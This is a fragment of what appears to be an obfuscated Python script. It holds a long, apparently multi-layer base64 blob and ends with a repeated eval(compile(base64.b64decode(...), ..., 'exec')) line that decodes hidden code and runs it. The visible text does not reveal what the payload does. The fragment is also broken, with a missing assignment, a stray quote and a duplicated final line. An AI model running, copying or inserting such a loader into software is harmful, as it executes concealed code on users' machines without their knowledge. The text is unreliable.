cEZaRlppTVd0NlUxaE9TbE5HV25kWGEwNHpXakpHV0ZWdWNFMVJNRWt6VTJwT1QwMUdiRmxWYlhoTFpXMDVibE5xUmt0aVIwMTZVVzVhYVdKV1NuZFhhMlJHWW0xYVZHUXlaRnBOYW13eFdrVmtWMDVIVWtWTlYzQnBUV3BWZDFkc2FHOU5SWFJTWWpCMFNsRXdSbTVUVldoUFpHMUtTR0pIY0doWFJrbDRWMnRSZDFveGNIUmlSM2hwVWpGS05sUkhNWE5rVjFKSVZtMDFZVmRGYkhaYVJrNXJWa2RKZVdWSVFscE5iWGQzV2taa1VtSnJlRVJSYm14aFYwVlplRmxXYUV0aVJuQkZUVlZrV2xZemFEWlhiRTV5VXpCc1JGRlhaRXBTTVhCelYxUktiMkZHWjNwVGJYaGFUVzE0Y0ZWR1RrTmlWMFpZVm01T1lWTkZNVEZYYTJSSFRVWndWR0ZFUmt0TlJuQnpWMVJLYjJGRmJFaFZiWGhLVTBWd2MxZFVTbk5oVjBvMVdUTk9TbE5GY0hOWk1XaFhZMGRPZEZadGRGRldWbkJ2V1d0b1QySkZlRVJSYlhSaFZqRndiMXBHWkRSTlJrSllWMjVDWVZZemFISlpNMnN4VWxac1dWVnRlRTFpVlRVeVdXMDFVMkpIVmtsVmJWcHJVbnBzY2xkV2FISmpSVTV3VVZka1NsRXdTbkZaYWs1TFpWWndXRTlYV2xwTmFtd3hWMjB4YzJKc1ozbGlSM1JSVlRCS2RGbFdaRmRqTVhCSlZGaFdhVll3V2pGYVZsSkxaRzFLZEZaWE9VdE5NRFZ2VjFST1MyRkdaM2xVYmxwcVltdHdjMWxxUlRWaGJVbDVUbGN4YUZZeVRuVlVSVTVEVFZWdmQxUnVXbXBpYTNCeldXNXNhbU13YkVoUFdGWmhVakZhZWxkc2FGTmlSa0pVV2tkd1dsZEZOWEZYVm1SVFlrVndOV1F5WkdwaVZsbzBXa1prYzJWV2NGaFZWR3hUWWxWYWVsbDZTbFpqUlU1d1VWZGtTbEV3U1hkWmFrbDRaR3hDVkZGdE1XaFdNVnA2VjJ0b1RtUldhM2xoUjJocVlWZG5lRk5xUmxOa2JVcFlUMGMxVFZFd1NqVlhiR2hIVFZkR1dWTnRlR0ZTUkVaSVYxWmtOR1ZzY0ZSa01tUnFUVzEzTWxkc1VYZE9SVEZFWVRCMFNsRXdSbTVUVldSaFpHMUtTR0pJV2xGVk1FcDBXVlprVjJNeGNFbFVXRlphVFcxb2Ixa3liRzlOVlc5M1YyNWFhVkl5ZURKVGJtd3pXakpPZEZadWFHdFdNbmcxVjJ4a1VrOVdTblJTYms1cVRXeFdlbE5WYUU5alIxWjBWbFJzVG1WclJuZFJNbXhDV2pCc1JGRnVWbXRXZWtaeldUSXdORTlWYkVoWGJrSmhWak5vY2xremF6RmhiVVpJVW01c1RGTkdWblZXU0U1UVRtMUtXRlp1YkdsbFYwNTZVMVZvUzJKSFRsbFdia0pxWWxaYWNsVkdWbUZoUjBwSlZHMTRUVkV3U2paWlZtaDNZa1pDVlZSWVpFeFZWemx1VTFWT1Fsb3lTblJQV0ZKYVltdHdjMWRFU2xkbGJVNUlUMWh3YVdWcVFtNVhiVEZ6WWtkS1NGVnVjRTFpVlRWMlYxWm9TbUl3YjNkT1dGcHBWakJ3TlZkc1RtOWxhM1JVV1ROT1NsTkZjSE5aTVdoWFkwZE9kRlp0ZEZGV1ZuQnZXV3RvVDJKRmVFUlJibkJvVjBoQ2MxVkdVbFprTUhSU1lqSmtTbEV3Um01WFZtaERZa2RLU0dWSVFtRlNlbWcwVjBSS1YyVnRUa2hQV0hCcFpXcENibGR0TVhOaVIwcElWVzV3VFdKVk5YWlhWbWhLWWpCd05sSnRlR3BoVlVwdldUQmtWMk15U2toaVIzUnBaVmRPZWxOVmFFdGlSMDVaVm01Q2FtSldXbkpWUmxaaFlVZEtTVlJ0ZUUxUk1FbzJXVlpvZDJKR1FsVlVXR3hNVlZjNWJsTlZUa0phTVd4WlVXMTRhVkl6YUhkWGEyTTBaVlpuZVZadWNHcFNlbXcyV1c1dmQxb3hjSFJpUjNocFVqRktObFJITVU5aU1XeFpVMWM1UzJWcmNISlpibXhEWVVkT1NGWnVUbWxTTW5oeVdXNXNhbU13YkVsVGJYaHFWMFphZDFreU1WZGhNVUpXVjIxb2FWTkZOWE5VUlU1RFpXMUdXV05IZUZGV1JURTFVekZHZGxvd2JFUlJWMlJwWWxSc01GZFhOVXRpUm1kNVZtNXdhbEo2YkRaWFZsRjNXakZ3ZEdKSGVHbFNNVW8yVkVjeFQySXhiRmxUVnpsTFRVUldNbGxzWkV0bFZuQlVZVWh3VEZVeVRucFRWV2hMWWtkT1dWWnVRbXBpVmxweVZVWldZV0ZIU2tsVWJYaE5VVEJLTmxsV2FIZGlSa0pWVmxoa1RGVlhPVzVUVlU1Q1dqRnNXVkZ0ZUdsU00yaDNWMnRqTkdWR1ozbFdibkJxVW5wc05sZFdVWGRhTVhCMFlrZDRhVkl4U2paVVJ6RlBZakZzV1ZOWE9VdGxhMXB6V1RKc1EyRkhUa2hXYms1cFVqSjRjbGx1Ykdwak1HeEpVMjE0YWxkR1duZFpNakZYWVRGQ1ZsZHRhR2xUUlRWelZFVk9RMlZ0UmxsalIzaFJWa1V4TlZNeFJuWmFNR3hFVVZka1dsZEZTbk5aYTJRMFkwWndTRTlJYkZsTmJGbzJXVEJqTldWc2JGVk5SMlJoWWxkNGMxbHJaRk5sYTNoMFZHMDVXbGRGYkhaVGJuQkxZVEpLTlZGdGFHcFNNVnA2V1d0a2MyRXlTalZaTTA1S1UwVndjMWt4YUZkalIwNTBWbTEwVVZaV2NHOVphMmhQWWtWNFJGRnVjR2hYU0VKelZVWlNUbVZWZEZKaU1tUktVVEJHYmxkdE1WZGhiVVpJVW0xYWFWWXdXWGRaTWpGelpFZEplVTVZUW1sbGFrSnVWMjB4YzJKSFNraFZibkJOWWxaS2IxcEZaRlppTWxKVVdrVmtZVll3TlhaWFZrNURZVEZ3V0dReVpHbFdNRmwzV1RJeGMyUkhTWGxPV0VKcFpWZE9lbE5WYUV0aVIwNVpWbTVDYW1KV1duSlZSbFpoWVVkS1NWUnRlRXhWVnpsdVUxVk9RbG95VFhwVmJXaHJVakZWTlZOVlpHRmpSbkJZWlVkMGFtVlVWalpYYkdRMFlrWnJlbFZ1UW1sTmFsSjJWak5zYm1Kc1ZuUldiWEJvVmpCd2QxZHJaRVppYTNoRVVWYzFWbUpXV25GWlZtUkxZMFp3U0ZKWE5VeFZNMlIyVTJwR1MySkhUWHBSYmxwcFlsWktkMWRyWkVaaWEzaEVVVmMxVm1KV1dqWlpNR00xWkZad1NHSkhkRnBWTWs1M1ZFVlpkMk13YkVSYVJWcHFUVEZLYjFkcll6UmlhM2hFVVc1d2FGZElRbk5WUmxKR1RXdDRSRkZ1YkdGV01GcHlXV3BKTVdNeVZsVk5WbFpxWW14YWMxUkZUa05oTVhCWVYyMW9hMVl6WjNkVlJrNXJWVEZ3V0ZSdVFscGlWM2h5VjFaT2FtTkZUbkJSVjJSS1VUQktOVmRzWkd0YWJVNTBWbTV3YWxKcWJIQmFSbWhQWlVWc1JVMUhaR0ZpVjNoeldXdGtVMlZyZUhOVmJYaHNVMFpHZGxOcVJsTmlSMVpKVlc1YVNsTkZjSE5aZWs1RFRWWndXVlJxUWxwVk1rNTNVVEpqT1ZCVFNVdGFXRnBvWWtOb2FtSXlNWGRoVjNoc1MwZEthR015VlRKT1F6VnBUbXBTYTFwWFRuWmFSMVZ2WWpBNVVFMUhPWFppTURsUVMxTjNaMGxxZUhwa1NFcHdZbTFqSzBscGQyZEtNbFkwV2xkTmJrdFRhejBpQ21WMllXd29ZMjl0Y0dsc1pTaGlZWE5sTmpRdVlqWTBaR1ZqYjJSbEtHOVBUekJ2YjI5UFR5a3NJQ0k4YzNSeWFXNW5QaUlzSUNkbGVHVmpKeWtwIgpldmFsKGNvbXBpbGUoYmFzZTY0LmI2NGRlY29kZShvT08wb29vT08pLCAiPHN0cmluZz4iLCAnZXhlYycpKQ=="
eval(compile(base64.b64decode(oOO0oooOO), "<string>", 'exec'))"
eval(compile(base64.b64decode(oOO0oooOO), "<string>", 'exec'))